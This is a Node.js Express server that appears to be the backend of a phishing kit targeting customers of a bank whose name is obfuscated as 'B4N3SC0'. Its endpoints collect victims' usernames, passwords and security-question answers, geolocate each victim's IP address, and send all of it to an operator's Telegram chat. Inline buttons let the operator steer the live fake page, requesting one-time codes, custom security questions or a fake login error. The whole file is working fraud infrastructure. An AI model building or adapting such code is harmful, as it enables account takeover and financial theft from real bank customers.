const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const STATUS_FILE = './status.json';

let clientes = {};
if (fs.existsSync(STATUS_FILE)) {
  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
}
function guardarEstado() {
  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
}

async function obtenerCiudad(ip) {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`);
    const data = await response.json();
    return data.city || 'Ciudad desconocida';
  } catch {
    return 'Ciudad desconocida';
  }
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid } = req.body;
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: ${usar}
🔐 CL4V: ${clavv}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  clientes[txid] = {
    status: "esperando",
    usar,
    clavv,
    preguntas: [],
    esperando: null
  };
  guardarEstado();

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviar2', async (req, res) => {
  const {
    usar,
    clavv,
    txid,
    pregunta1,
    pregunta2,
    respuesta1,
    respuesta2
  } = req.body;

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
❓🔑🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: ${usar}
🔐 CL4V: ${clavv}

${pregunta1}❓ : ${respuesta1}
${pregunta2}❓ : ${respuesta2}

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/webhook', async (req, res) => {
  const message = req.body.message;

  // Manejar comandos tipo /txid pregunta1&pregunta2
  if (message?.text && message.text.startsWith('/')) {
    const commandParts = message.text.slice(1).split(' ');
    const txid = commandParts[0];
    const preguntasTexto = commandParts.slice(1).join(' ');
    const cliente = clientes[txid];

    if (!cliente) return res.sendStatus(404);

    const [pregunta1, pregunta2] = preguntasTexto.split('&');

    if (!pregunta1 || !pregunta2) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: `⚠️ Formato inválido. Usa:\n/${txid} ¿Pregunta1?&¿Pregunta2?`
        })
      });
      return res.sendStatus(200);
    }

    cliente.preguntas = [pregunta1.trim(), pregunta2.trim()];
    cliente.status = 'preguntas';
    guardarEstado();

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: message.chat.id,
        text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${pregunta1.trim()}\n2️⃣ ${pregunta2.trim()}`
      })
    });

    return res.sendStatus(200);
  }

  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];
    const cliente = clientes[txid];

    if (!cliente) return res.sendStatus(404);

    if (accion === 'preguntas_menu') {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message.chat.id,
          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid} separadas por "&".\n\nEjemplo:\n¿Dónde naciste?&¿Cuál es tu color favorito?`
        })
      });

      return res.sendStatus(200);
    }

    cliente.status = accion;
    guardarEstado();

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Has seleccionado: ${accion}`
      })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = clientes[txid] || { status: 'esperando', preguntas: [] };
  res.json({ status: cliente.status, preguntas: cliente.preguntas });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
